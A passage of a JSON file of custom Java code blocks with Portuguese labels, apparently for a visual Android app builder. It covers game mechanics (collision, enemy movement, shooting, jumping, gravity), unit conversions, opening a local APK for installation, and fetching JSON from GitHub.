view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    float deltaX \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    float deltaY \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX \u003e deltaY) {\n        // Puxar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s - (view2Width%3$s - (view2X%3$s - view1X%3$s))); // Puxar para a direita\n        } else {\n            %2$s.setX(view2X%3$s + (view1X%3$s - (view2X%3$s + view2Width%3$s))); // Puxar para a esquerda\n        }\n    } else {\n        // Puxar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s - (view2Height%3$s - (view2Y%3$s - view1Y%3$s))); // Puxar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s + (view1Y%3$s - (view2Y%3$s + view2Height%3$s))); // Puxar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy19","typeName":"","palette":"252","type":"c","spec":"View:%m.view puxe %m.view id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    int pullFactor \u003d %4$s; // Fator de suavidade para o puxão\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Puxar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s - Math.min(pullFactor, (view2Width%3$s - (view2X%3$s - view1X%3$s)))); // Puxar para a direita\n        } else {\n            %2$s.setX(view2X%3$s + Math.min(pullFactor, (view1X%3$s - (view2X%3$s + view2Width%3$s)))); // Puxar para a esquerda\n        }\n    } else {\n        // Puxar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s - Math.min(pullFactor, (view2Height%3$s - (view2Y%3$s - view1Y%3$s)))); // Puxar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s + Math.min(pullFactor, (view1Y%3$s - (view2Y%3$s + view2Height%3$s)))); // Puxar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy72","typeName":"","palette":"252","type":"c","spec":"View:%m.view puxe %m.view id:%d suavidade:%d  ","spec2":"else"},{"code":"","color":"#FFF44336","name":"enemyblocks","typeName":"","palette":"252","type":"h","spec":"enemy"},{"code":"// Variáveis para as views\nView %2$s%1$s \u003d findViewById(R.id.%2$s); // Substitua pelo ID correto da view do jogador\nView %3$s%1$s \u003d findViewById(R.id.%3$s);   // Substitua pelo ID correto da view do inimigo\n\n// Variável para a velocidade de movimento\nfloat speed%1$s \u003d %4$sf; // Velocidade de movimento do inimigo\n\n// Configurações do Timer\nTimer timer%1$s \u003d new Timer();\ntimer%1$s.schedule(new TimerTask() {\n    @Override\n    public void run() {\n        // Obtém as posições atuais do jogador e do inimigo\n        float playerX%1$s \u003d %2$s%1$s.getX();\n        float playerY%1$s \u003d %2$s%1$s.getY();\n        float enemyX%1$s \u003d %3$s%1$s.getX();\n        float enemyY%1$s \u003d %3$s%1$s.getY();\n\n        // Calcula a distância entre o inimigo e o jogador\n        float dx%1$s \u003d playerX%1$s - enemyX%1$s;\n        float dy%1$s \u003d playerY%1$s - enemyY%1$s;\n        float distance%1$s \u003d (float) Math.sqrt(dx%1$s * dx%1$s + dy%1$s * dy%1$s);\n\n        // Calcula a nova posição do inimigo\n        if (distance%1$s \u003e 0) {\n            float moveX%1$s \u003d (dx%1$s / distance%1$s) * speed%1$s;\n            float moveY%1$s \u003d (dy%1$s / distance%1$s) * speed%1$s;\n            %3$s%1$s.setX(enemyX%1$s + moveX%1$s);\n            %3$s%1$s.setY(enemyY%1$s + moveY%1$s);\n        }\n    }\n}, 0, 30); // Atualiza a cada 30 milissegundos","color":"#FFF44336","name":"enemy","typeName":"","palette":"252","type":" ","spec":"enemy id:%s.inputOnly | fazer view:%m.view seguir %m.view velocidade:"},{"code":"// Variáveis para as views\nView %2$s%1$s \u003d findViewById(R.id.%2$s); // View do inimigo\nView %3$s%1$s \u003d findViewById(R.id.%3$s); // View a ser evitada\n\n// Variáveis para a velocidade de movimento e distância mínima\nfloat speed%1$s \u003d %4$sf; // Velocidade de movimento do inimigo\nfloat avoidDistance%1$s \u003d %5$sf; // Distância mínima para evitar a view\n\n// Configurações do Timer\nTimer timer%1$s \u003d new Timer();\ntimer%1$s.schedule(new TimerTask() {\n    @Override\n    public void run() {\n        // Obtém as posições atuais do inimigo e da view a ser evitada\n        float enemyX%1$s \u003d %2$s%1$s.getX();\n        float enemyY%1$s \u003d %2$s%1$s.getY();\n        float avoidX%1$s \u003d %3$s%1$s.getX();\n        float avoidY%1$s \u003d %3$s%1$s.getY();\n\n        // Calcula a distância entre o inimigo e a view a ser evitada\n        float dxToAvoid%1$s \u003d avoidX%1$s - enemyX%1$s;\n        float dyToAvoid%1$s \u003d avoidY%1$s - enemyY%1$s;\n        float distanceToAvoid%1$s \u003d (float) Math.sqrt(dxToAvoid%1$s * dxToAvoid%1$s + dyToAvoid%1$s * dyToAvoid%1$s);\n\n        // Calcula a nova posição do inimigo\n        float moveX%1$s \u003d 0;\n        float moveY%1$s \u003d 0;\n\n        if (distanceToAvoid%1$s \u003c avoidDistance%1$s) {\n            // Se estiver perto da view a ser evitada, move o inimigo para longe\n            moveX%1$s \u003d -dxToAvoid%1$s / distanceToAvoid%1$s * speed%5$s;\n            moveY%1$s \u003d -dyToAvoid%1$s / distanceToAvoid%1$s * speed%1$s;\n        }\n\n        // Atualiza a posição do inimigo\n        %2$s%1$s.setX(enemyX%1$s + moveX%1$s);\n        %2$s%1$s.setY(enemyY%1$s + moveY%1$s);\n    }\n}, 0, 30); // Atualiza a cada 30 milissegundos","color":"#FFF44336","name":"enemy_copy23","typeName":"","palette":"252","type":" ","spec":"enemy id:%s.inputOnly | fazer view:%m.view evitar %m.view velocidade:%d distânciaMin:%d "},{"code":"","color":"#FFF44336","name":"shoot","typeName":"","palette":"249","type":"h","spec":"shoot"},{"code":"// Define a velocidade do projétil\nint speed%5$s \u003d %4$s; // Velocidade do projétil\n\n// Calcula a direção em que o projétil deve se mover com base no ângulo\ndouble angleRad%5$s \u003d Math.toRadians(%3$s); // Converte o ângulo para radianos\nint deltaX%5$s \u003d (int) (speed%5$s * Math.cos(angleRad%5$s));\nint deltaY%5$s \u003d (int) (speed%5$s * Math.sin(angleRad%5$s));\n\n// Cria e posiciona o projétil\nView projectile%5$s \u003d %1$s; // View do projétil\nView shooter%5$s \u003d %2$s; // View que está atirando\nint startX%5$s \u003d (int) projectile%5$s.getX();\nint startY%5$s \u003d (int) projectile%5$s.getY();\n\n// Verifica se o ângulo é 0\nif (%3$s \u003d\u003d 0) {\n    // Adicione o código adicional necessário aqui\n    %6$s; // Código específico para o ângulo 0\n}\n\n// Movimenta o projétil com base na força do joystick\nprojectile%5$s.setX(startX%5$s + deltaX%5$s); \nprojectile%5$s.setY(startY%5$s + deltaY%5$s);","color":"#FFF44336","name":"atirar angulo","typeName":"","palette":"249","type":"c","spec":"atirar| projétil:%m.view atirador:%m.view angle:%d velocidadeTiro:%d id:%d | se ângulo for 0:"},{"code":"// Define a velocidade do projétil\nint speed%5$s \u003d %4$s; // Velocidade do projétil\n\n// Cria o projétil dinamicamente\nImageView projectile%5$s \u003d new ImageView(context); // Contexto da sua aplicação\nprojectile%5$s.setImageResource(%1$s); // Define a imagem do projétil\nprojectile%5$s.setLayoutParams(new ViewGroup.LayoutParams(\n        ViewGroup.LayoutParams.WRAP_CONTENT, \n        ViewGroup.LayoutParams.WRAP_CONTENT));\n\n// Adiciona o projétil ao layout\nViewGroup layout%5$s \u003d (ViewGroup) %2$s.getParent(); // Obtém o layout da view atirador\nlayout%5$s.addView(projectile%5$s);\n\n// Define a posição inicial do projétil\nint startX%5$s \u003d (int) %2$s.getX();\nint startY%5$s \u003d (int) %2$s.getY();\nprojectile%5$s.setX(startX%5$s);\nprojectile%5$s.setY(startY%5$s);\n\n// Calcula a direção do projétil com base no ângulo\ndouble angleRad%5$s \u003d Math.toRadians(%3$s); // Converte o ângulo para radianos\nint deltaX%5$s \u003d (int) (speed%5$s * Math.cos(angleRad%5$s));\nint deltaY%5$s \u003d (int) (speed%5$s * Math.sin(angleRad%5$s));\n\n// Movimenta o projétil\nprojectile%5$s.setX(startX%5$s + deltaX%5$s);\nprojectile%5$s.setY(startY%5$s + deltaY%5$s);\n\n// Verifica se o ângulo é 0\nif (%3$s \u003d\u003d 0) {\n    // Adicione o código adicional necessário aqui\n    %6$s; // Código específico para o ângulo 0\n}","color":"#FFF44336","name":"atirar angulo_copy48","typeName":"","palette":"249","type":"c","spec":"atirar| projétil:%m.imageview  atirador:%m.view angle:%d velocidadeTiro:%d id:%d | se ângulo for 0:"},{"code":"","color":"#FFF44336","name":"shootblocks","typeName":"","palette":"252","type":"h","spec":"shoot"},{"code":"// Define a velocidade do projétil\nint speed%4$s \u003d %3$s; // Velocidade do projétil\n\n// Cria e posiciona o projétil\nView projectile%4$s \u003d %1$s; // View do projétil\nView shooter%4$s \u003d %2$s; // View que está atirando\nint startX%4$s \u003d (int) shooter%4$s.getX(); // Usa a posição do atirador\nint startY%4$s \u003d (int) shooter%4$s.getY(); // Usa a posição do atirador\n\n// Define a direção do movimento para Direita\nprojectile%4$s.setX(startX%4$s + speed%4$s);\nprojectile%4$s.setY(startY%4$s); // Mantém a posição Y","color":"#FFF44336","name":"copy","typeName":"","palette":"252","type":" ","spec":"atirar direita| projétil:%m.view atirador:%m.view velocidade:%d id:%d "},{"code":"// Define a velocidade do projétil\nint speed%4$s \u003d %3$s; // Velocidade do projétil\n\n// Cria e posiciona o projétil\nView projectile%4$s \u003d %1$s; // View do projétil\nView shooter%4$s \u003d %2$s; // View que está atirando\nint startX%4$s \u003d (int) shooter%4$s.getX(); // Usa a posição do atirador\nint startY%4$s \u003d (int) shooter%4$s.getY(); // Usa a posição do atirador\n\n// Define a direção do movimento para Esquerda\nprojectile%4$s.setX(startX%4$s - speed%4$s);\nprojectile%4$s.setY(startY%4$s); // Mantém a posição Y","color":"#FFF44336","name":"_copy53","typeName":"","palette":"252","type":" ","spec":"atirar esquerda| projétil:%m.view atirador:%m.view velocidade:%d id:%d "},{"code":"// Define a velocidade do projétil\nint speed%4$s \u003d %3$s; // Velocidade do projétil\n\n// Cria e posiciona o projétil\nView projectile%4$s \u003d %1$s; // View do projétil\nView shooter%4$s \u003d %2$s; // View que está atirando\nint startX%4$s \u003d (int) shooter%4$s.getX(); // Usa a posição do atirador\nint startY%4$s \u003d (int) shooter%4$s.getY(); // Usa a posição do atirador\n\n// Define a direção do movimento para Cima\nprojectile%4$s.setX(startX%4$s); // Mantém a posição X\nprojectile%4$s.setY(startY%4$s - speed%4$s);","color":"#FFF44336","name":"_copy96","typeName":"","palette":"252","type":" ","spec":"atirar cima| projétil:%m.view atirador:%m.view velocidade:%d id:%d "},{"code":"// Define a velocidade do projétil\nint speed%4$s \u003d %3$s; // Velocidade do projétil\n\n// Cria e posiciona o projétil\nView projectile%4$s \u003d %1$s; // View do projétil\nView shooter%4$s \u003d %2$s; // View que está atirando\nint startX%4$s \u003d (int) shooter%4$s.getX(); // Usa a posição do atirador\nint startY%4$s \u003d (int) shooter%4$s.getY(); // Usa a posição do atirador\n\n// Define a direção do movimento para Baixo\nprojectile%4$s.setX(startX%4$s); // Mantém a posição X\nprojectile%4$s.setY(startY%4$s + speed%4$s);","color":"#FFF44336","name":"_copy87","typeName":"","palette":"252","type":" ","spec":"atirar baixo| projétil:%m.view atirador:%m.view velocidade:%d id:%d "},{"code":"","color":"#FFF44336","name":"enemyshoot","typeName":"","palette":"252","type":"h","spec":"enemy shoot"},{"code":"// Define a velocidade do projétil\nint speed%4$s \u003d %3$s; // Velocidade do projétil\n\n// Cria e posiciona o projétil\nView projectile%4$s \u003d %1$s; // View do projétil\nView shooter%4$s \u003d %2$s; // View do inimigo que está atirando\nView target%4$s \u003d %5$s; // View do alvo\n\n// Obtém as coordenadas do atirador (inimigo) e do alvo\nint shooterX%4$s \u003d (int) shooter%4$s.getX();\nint shooterY%4$s \u003d (int) shooter%4$s.getY();\nint targetX%4$s \u003d (int) target%4$s.getX();\nint targetY%4$s \u003d (int) target%4$s.getY();\n\n// Calcula a direção do projétil\nint deltaX%4$s \u003d targetX%4$s - shooterX%4$s;\nint deltaY%4$s \u003d targetY%4$s - shooterY%4$s;\ndouble distance%4$s \u003d Math.sqrt(deltaX%4$s * deltaX%4$s + deltaY%4$s * deltaY%4$s);\n\n// Normaliza a direção\ndouble directionX%4$s \u003d deltaX%4$s / distance%4$s;\ndouble directionY%4$s \u003d deltaY%4$s / distance%4$s;\n\n// Move o projétil na direção do alvo\nprojectile%4$s.setX(shooterX%4$s + (int)(directionX%4$s * speed%4$s));\nprojectile%4$s.setY(shooterY%4$s + (int)(directionY%4$s * speed%4$s));","color":"#FFF44336","name":"enemyshooot","typeName":"","palette":"252","type":" ","spec":"Inimigo Atirar | projétil:%m.view enemyAtirador:%m.view velocidade:%d id:%d alvo:%m.view "},{"code":"","color":"#FFF44336","name":"distance","typeName":"","palette":"252","type":"h","spec":"distance"},{"code":"// Define a distância máxima para considerar que as views estão próximas\ndouble maxDistance%4$s \u003d %3$s; // Distância máxima permitida\n\n// Obtém as coordenadas das views\nint view1X%4$s \u003d (int) %1$s.getX();\nint view1Y%4$s \u003d (int) %1$s.getY();\nint view2X%4$s \u003d (int) %2$s.getX();\nint view2Y%4$s \u003d (int) %2$s.getY();\n\n// Calcula a diferença nas coordenadas\nint deltaX%4$s \u003d view2X%4$s - view1X%4$s;\nint deltaY%4$s \u003d view2Y%4$s - view1Y%4$s;\n\n// Calcula a distância usando a fórmula da distância euclidiana\ndouble distance%4$s \u003d Math.sqrt(deltaX%4$s * deltaX%4$s + deltaY%4$s * deltaY%4$s);\n\n// Verifica se a distância é menor que a distância máxima permitida\nif (distance%4$s \u003c\u003d maxDistance%4$s) {\n    // Código para quando as views estão próximas\n    %5$s; // Ação específica para quando estão próximas\n} else {\n    // Código para quando as views não estão próximas\n    %6$s; // Ação específica para quando não estão próximas\n}","color":"#FFF44336","name":"detectRange","typeName":"","palette":"252","type":"e","spec":"se view:%m.view estiver perto de view:%m.view distânciaMax:%d id:%d ","spec2":"else"},{"code":"// Obtém a resolução da tela\nDisplayMetrics displayMetrics%2$s \u003d new DisplayMetrics();\ngetWindowManager().getDefaultDisplay().getMetrics(displayMetrics%2$s);\nint screenWidth%2$s \u003d displayMetrics%2$s.widthPixels;\nint screenHeight%2$s \u003d displayMetrics%2$s.heightPixels;\n\n// Verifica se a view está fora da resolução da tela e a move para longe se necessário\nint viewX%2$s \u003d (int) %1$s.getX();\nint viewY%2$s \u003d (int) %1$s.getY();\nint viewWidth%2$s \u003d %1$s.getWidth();\nint viewHeight%2$s \u003d %1$s.getHeight();\n\nif (viewX%2$s + viewWidth%2$s \u003c 0 || viewX%2$s \u003e screenWidth%2$s || \n    viewY%2$s + viewHeight%2$s \u003c 0 || viewY%2$s \u003e screenHeight%2$s) {\n    // Move a view para um local longe da área visível\n    %1$s.setX(-9999); // Move a view para fora do alcance visível na horizontal\n    %1$s.setY(-9999); // Move a view para fora do alcance visível na vertical\n}","color":"#FFF44336","name":"hide","typeName":"","palette":"252","type":" ","spec":"esconder view:%m.view id:%d "},{"code":"String PATH \u003d Environment.getExternalStorageDirectory() + %1$s;\njava.io.File file \u003d new java.io.File(PATH);\n\nif(file.exists()) { \n    Intent intent \u003d new Intent(Intent.ACTION_VIEW);\n    intent.setDataAndType(uriFromFile(getApplicationContext(), new java.io.File(PATH)), \"application/vnd.android.package-archive\");\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n    try {\n        getApplicationContext().startActivity(intent);\n    } catch (ActivityNotFoundException e) {\n        e.printStackTrace();\n        Log.e(\"TAG\", \"Error in opening the file!\");\n    }\n} else {\n    Toast.makeText(getApplicationContext(), %2$s, Toast.LENGTH_LONG).show();\n}\n\nUri uriFromFile(Context context, java.io.File file) {\n    if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.N) {\n        return androidx.core.content.FileProvider.getUriForFile(context, context.getApplicationContext().getPackageName() + \".provider\", file);\n    } else {\n        return Uri.fromFile(file);\n    }\n}","color":"#FF0097A7","name":"download","typeName":"","palette":"178","type":" ","spec":"download apk caminho /storage/emulated/0/%s.inputOnly "},{"code":"%1$s.setOnTouchListener(new OnTouchListener() {\n\n    PointF downPT%2$s \u003d new PointF();\n    PointF startPT%2$s \u003d new PointF();\n\n    @Override \n    public boolean onTouch(View v, MotionEvent event) {\n\n        int eid%2$s \u003d event.getAction(); \n        switch (eid%2$s) {\n            case MotionEvent.ACTION_MOVE : \n                PointF mv%2$s \u003d new PointF(event.getX() - downPT%2$s.x, event.getY() - downPT%2$s.y);\n\n                %1$s.setX((int)(startPT%2$s.x + mv%2$s.x)); \n                %1$s.setY((int)(startPT%2$s.y + mv%2$s.y));\n\n                startPT%2$s \u003d new PointF(%1$s.getX(), %1$s.getY());\n\n                break;\n\n            case MotionEvent.ACTION_DOWN : \n                downPT%2$s.x \u003d event.getX();\n                downPT%2$s.y \u003d event.getY();\n                startPT%2$s \u003d new PointF(%1$s.getX(), %1$s.getY()); \n\n                break;\n\n            case MotionEvent.ACTION_UP : \n                break; \n\n            default : \n                break;\n        } \n        return true;\n    } \n});","color":"#FFBA68C8","name":"dragging","typeName":"","palette":"244","type":" ","spec":"tornar view:%m.view arrastavel id:%d "},{"code":"%1$s / 60","color":"#FF8BC34A","name":"segundosParaMinutos","typeName":"","palette":"254","type":"d","spec":"converter segundos %d para minutos"},{"code":"%1$s * 60","color":"#FF8BC34A","name":"minutosParaSegundos","typeName":"","palette":"254","type":"d","spec":"converter minutos %d para segundos"},{"code":"%1$s / 60","color":"#FF8BC34A","name":"minutosParaHoras","typeName":"","palette":"254","type":"d","spec":"converter minutos %d para horas"},{"code":"%1$s * 60","color":"#FF8BC34A","name":"horasParaMinutos","typeName":"","palette":"254","type":"d","spec":"converter horas %d para minutos"},{"code":"%1$s * 1.60934","color":"#FF8BC34A","name":"milhasParaKm","typeName":"","palette":"254","type":"d","spec":"converter milhas %d para km"},{"code":"%1$s / 1.60934","color":"#FF8BC34A","name":"kmParaMilhas","typeName":"","palette":"254","type":"d","spec":"converter km %d para milhas"},{"code":"%1$s * 0.3048","color":"#FF8BC34A","name":"pesParaMetros","typeName":"","palette":"254","type":"d","spec":"converter pés %d para metros"},{"code":"%1$s / 0.3048","color":"#FF8BC34A","name":"metrosParaPes","typeName":"","palette":"254","type":"d","spec":"converter metros %d para pés"},{"code":"%1$s * 2.54","color":"#FF8BC34A","name":"polegadasParaCm","typeName":"","palette":"254","type":"d","spec":"converter polegadas %d para cm"},{"code":"%1$s / 2.54","color":"#FF8BC34A","name":"cmParaPolegadas","typeName":"","palette":"254","type":"d","spec":"converter cm %d para polegadas"},{"code":"%1$s * 0.453592","color":"#FF8BC34A","name":"librasParaKg","typeName":"","palette":"254","type":"d","spec":"converter libras %d para kg"},{"code":"%1$s / 0.453592","color":"#FF8BC34A","name":"kgParaLibras","typeName":"","palette":"254","type":"d","spec":"converter kg %d para libras"},{"code":"%1$s / 1000","color":"#FF8BC34A","name":"gramasParaKg","typeName":"","palette":"254","type":"d","spec":"converter gramas %d para kg"},{"code":"%1$s * 1000","color":"#FF8BC34A","name":"kgParaGramas","typeName":"","palette":"254","type":"d","spec":"converter kg %d para gramas"},{"code":"// URL do arquivo JSON no GitHub\nString url%1$s \u003d %2$s; // Exemplo: https://raw.githubusercontent.com/user/repo/main/list.json\n\n// Variável para armazenar a lista JSON\nString %3$s \u003d \"\";\n\n// Criar cliente OkHttp\nOkHttpClient client%1$s \u003d new OkHttpClient();\n\n// Criar a requisição GET\nRequest request%1$s \u003d new Request.Builder()\n    .url(url%1$s)\n    .build();\n\n// Fazer a requisição assíncrona\nclient%1$s.newCall(request%1$s).enqueue(new Callback() {\n    @Override\n    public void onFailure(Call call, IOException e) {\n        e.printStackTrace();\n    }\n\n    @Override\n    public void onResponse(Call call, Response response) throws IOException {\n        if (response.isSuccessful()) {\n            // Armazenar a resposta JSON na variável\n            %3$s \u003d response.body().string();\n        }\n    }\n});","color":"#FF000000","name":"Get Json from github","typeName":"","palette":"253","type":" ","spec":"id:%d Armazenar json do link raw github %s  na variavel:%s "},{"code":"if ((%1$s % 2) \u003d\u003d 0) {\r\n\t%2$s \u003d true;\r\n}\r\nelse {\r\n\t%2$s \u003d false;\r\n}","color":"#FFE57373","name":"impar ou par","typeName":"","palette":"222","type":" ","spec":"impar ou par %d e armazenar na váriavel:%s.inputOnly "},{"code":"","color":"#FFF44336","name":"gravity","typeName":"","palette":"252","type":"h","spec":"gravidade"},{"code":"final View AnimatorView%1$s \u003d findViewById(R.id.%2$s); // Componente da sua view\nfinal float distancia%1$s \u003d %3$s; // Distância para mover\nfinal int duracaoPulo%1$s \u003d %4$s; // Duração do pulo (em milissegundos)\nfinal int duracaoQueda%1$s \u003d %5$s; // Duração da queda (em milissegundos)\n\n// Subir a view\nAnimatorView%1$s.setY(AnimatorView%1$s.getY() - distancia%1$s);\n\n// Aguardar o tempo do pulo antes de descer\nnew Handler().postDelayed(new Runnable() {\n    @Override\n    public void run() {\n        // Descer a view após o pulo\n        AnimatorView%1$s.setY(AnimatorView%1$s.getY() + distancia%1$s);\n    }\n}, duracaoPulo%1$s); // Aguardar duração do pulo antes de descer","color":"#FFF44336","name":"pulo","typeName":"","palette":"252","type":" ","spec":"pulo | id:%d view:%m.view distância:%d duraçãoPulo:%d duraçãoQueda:%d "},{"code":"final View AnimatorView%1$s \u003d findViewById(R.id.%2$s); // Componente da sua view\nfinal float distancia%1$s \u003d %3$s; // Distância para mover\nfinal int duracaoPulo%1$s \u003d %4$s; // Duração do pulo (em milissegundos)\nfinal int duracaoQueda%1$s \u003d %5$s; // Duração da queda (em milissegundos)\n\n// Criar o ValueAnimator para subir a view\nValueAnimator subirAnimator \u003d ValueAnimator.ofFloat(AnimatorView%1$s.getY(), AnimatorView%1$s.getY() - distancia%1$s);\nsubirAnimator.setDuration(duracaoPulo%1$s); // Duração do pulo\nsubirAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n    @Override\n    public void onAnimationUpdate(ValueAnimator animation) {\n        float animatedValue \u003d (float) animation.getAnimatedValue();\n        AnimatorView%1$s.setY(animatedValue); // Atualizar a posição Y da view\n    }\n});\n\n// Iniciar a animação de subida\nsubirAnimator.start();\n\n// Aguardar o tempo do pulo antes de descer\nsubirAnimator.addListener(new AnimatorListenerAdapter() {\n    @Override\n    public void onAnimationEnd(Animator animation) {\n        // Criar o ValueAnimator para descer a view\n        ValueAnimator descerAnimator \u003d ValueAnimator.ofFloat(AnimatorView%1$s.getY(), AnimatorView%1$s.getY() + distancia%1$s);\n        descerAnimator.setDuration(duracaoQueda%1$s); // Duração da queda\n        descerAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                float animatedValue \u003d (float) animation.getAnimatedValue();\n                AnimatorView%1$s.setY(animatedValue); // Atualizar a posição Y da view\n            }\n        });\n\n        // Iniciar a animação de descida\n        descerAnimator.start();\n    }\n});","color":"#FFF44336","name":"pulo_copy36","typeName":"","palette":"252","type":" ","spec":"pulo suave | id:%d view:%m.view distância:%d duraçãoPulo:%d duraçãoQueda:%d "},{"code":"final View AnimatorView%1$s \u003d findViewById(R.id.%2$s); // Componente da sua view\nfinal float alturaInicial%1$s \u003d AnimatorView%1$s.getY(); // Posição inicial Y da view\nfinal float distancia%1$s \u003d %3$s; // Distância total para cair\nfinal int duracaoQueda%1$s \u003d %4$s; // Duração total da queda (em milissegundos)\n\n// Criar um ValueAnimator para a animação de queda\nValueAnimator quedaAnimator \u003d ValueAnimator.ofFloat(alturaInicial%1$s, alturaInicial%1$s + distancia%1$s);\nquedaAnimator.setDuration(duracaoQueda%1$s); // Duração total da queda\nquedaAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n    private float velocidade \u003d 0; // Velocidade inicial\n    private float tempoDecorrido \u003d 0; // Tempo decorrido em segundos\n\n    @Override\n    public void onAnimationUpdate(ValueAnimator animation) {\n        // Atualizar o tempo decorrido\n        tempoDecorrido +\u003d (duracaoQueda%1$s / 1000f) / 60f; // Considerando 60 FPS\n        float gravidade \u003d 9.8f; // Aceleração da gravidade em pixels por segundo ao quadrado\n\n        // Aceleração aumenta a cada segundo\n        velocidade +\u003d gravidade * tempoDecorrido; \n\n        float novoY \u003d AnimatorView%1$s.getY() + velocidade / 60f; // Atualiza a posição Y\n        AnimatorView%1$s.setY(novoY); // Atualiza a posição Y da view\n    }\n});\n\n// Iniciar a animação de queda\nquedaAnimator.start();","color":"#FFF44336","name":"queda gravidade","typeName":"","palette":"252","type":" ","spec":"gravidade | id:%d view:%m.view distancia total pra cair:%d duração Queda:%d "}]